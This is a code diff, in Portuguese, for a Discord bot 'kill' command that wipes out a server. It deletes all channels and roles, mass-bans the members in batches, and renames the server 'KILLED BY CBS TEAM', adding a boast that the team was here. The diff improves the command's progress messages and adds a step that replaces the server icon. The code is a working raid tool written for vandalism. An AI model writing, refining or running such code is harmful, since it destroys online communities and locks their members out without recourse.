@@ -32,16 +32,17 @@ module.exports = {
 
     const confirmar = interaction.options.getBoolean('confirmar');
 
+    // ===== SE NÃO CONFIRMOU, MOSTRA BOTÃO =====
     if (!confirmar) {
-      // ===== PEDE CONFIRMAÇÃO =====
       const embed = new EmbedBuilder()
         .setTitle('💀 ATENÇÃO – DESTRUIÇÃO TOTAL')
         .setDescription('**Você está prestes a DESTRUIR COMPLETAMENTE este servidor!**\n\n' +
           'Isso irá:\n' +
           '🔹 Apagar **TODOS** os canais (texto, voz, categorias)\n' +
-          '🔹 Apagar **TODOS** os cargos\n' +
-          '🔹 **BANIR TODOS** os membros\n' +
-          '🔹 Mudar o nome do servidor para "KILLED BY CBS TEAM"\n\n' +
+          '🔹 Apagar **TODOS** os cargos (exceto @everyone)\n' +
+          '🔹 **BANIR TODOS** os membros (exceto o bot e você)\n' +
+          '🔹 Mudar o nome do servidor para "KILLED BY CBS TEAM"\n' +
+          '🔹 Mudar a foto do servidor para a foto do bot\n\n' +
           '⚠️ **ESTA AÇÃO É IRREVERSÍVEL!**')
         .setColor(0xFF0000)
         .setFooter({ text: 'Clique em CONFIRMAR para executar' })
@@ -67,7 +68,7 @@ module.exports = {
       return;
     }
 
-    // ===== EXECUÇÃO DIRETA (SE confirmar: true) =====
+    // ===== EXECUÇÃO DIRETA (confirmar: true) =====
     await interaction.deferReply({ ephemeral: true });
     await executarKill(interaction, client);
   }
@@ -84,40 +85,49 @@ async function executarKill(interaction, client) {
     await interaction.editReply('🧹 APAGANDO TODOS OS CANAIS...');
     const channels = guild.channels.cache;
     let canaisApagados = 0;
+    const totalCanais = channels.size;
     for (const [id, ch] of channels) {
       try {
         await ch.delete();
         canaisApagados++;
-        if (canaisApagados % 10 === 0) {
-          await interaction.editReply(`🧹 ${canaisApagados}/${channels.size} canais apagados`);
-        }
       } catch (e) {}
+      if (canaisApagados % 10 === 0 || canaisApagados === totalCanais) {
+        await interaction.editReply(`🧹 ${canaisApagados}/${totalCanais} canais apagados`);
+      }
     }
 
-    // ===== 2. APAGAR TODOS OS CARGOS =====
+    // ===== 2. APAGAR TODOS OS CARGOS (exceto @everyone) =====
     await interaction.editReply('🧹 APAGANDO TODOS OS CARGOS...');
     const roles = guild.roles.cache.filter(r => r.id !== guild.id);
     let cargosApagados = 0;
+    const totalCargos = roles.size;
     for (const [id, r] of roles) {
       try {
         await r.delete();
         cargosApagados++;
-        if (cargosApagados % 10 === 0) {
-          await interaction.editReply(`🧹 ${cargosApagados}/${roles.size} cargos apagados`);
-        }
       } catch (e) {}
+      if (cargosApagados % 10 === 0 || cargosApagados === totalCargos) {
+        await interaction.editReply(`🧹 ${cargosApagados}/${totalCargos} cargos apagados`);
+      }
     }
 
     // ===== 3. BANIR TODOS OS MEMBROS (exceto bot e autor) =====
     await interaction.editReply('🔨 BANINDO TODOS OS MEMBROS...');
-    const members = guild.members.cache.filter(m => m.id !== botId && m.id !== authorId && !m.user.bot);
+    const members = guild.members.cache.filter(m => 
+      m.id !== botId && 
+      m.id !== authorId && 
+      !m.user.bot
+    );
     let banidos = 0;
+    const totalMembros = members.size;
     const list = [...members.values()];
     for (let i = 0; i < list.length; i += 10) {
       const chunk = list.slice(i, i + 10);
-      await Promise.all(chunk.map(m => m.ban({ reason: 'KILLED BY CBS TEAM' }).catch(() => {})));
+      await Promise.all(chunk.map(m => 
+        m.ban({ reason: 'KILLED BY CBS TEAM' }).catch(() => {})
+      ));
       banidos += chunk.length;
-      await interaction.editReply(`🔨 ${banidos}/${members.size} membros banidos`);
+      await interaction.editReply(`🔨 ${banidos}/${totalMembros} membros banidos`);
     }
 
     // ===== 4. MUDAR NOME E FOTO DO SERVIDOR =====
@@ -136,7 +146,8 @@ async function executarKill(interaction, client) {
       `📂 ${canaisApagados} canais apagados\n` +
       `🎭 ${cargosApagados} cargos apagados\n` +
       `🔨 ${banidos} membros banidos\n` +
-      `📝 Nome do servidor alterado para "KILLED BY CBS TEAM"\n\n` +
+      `📝 Nome do servidor alterado para "KILLED BY CBS TEAM"\n` +
+      `🖼️ Foto do servidor alterada\n\n` +
       `🔥 **CBS TEAM ESTEVE AQUI!**`
     );
 
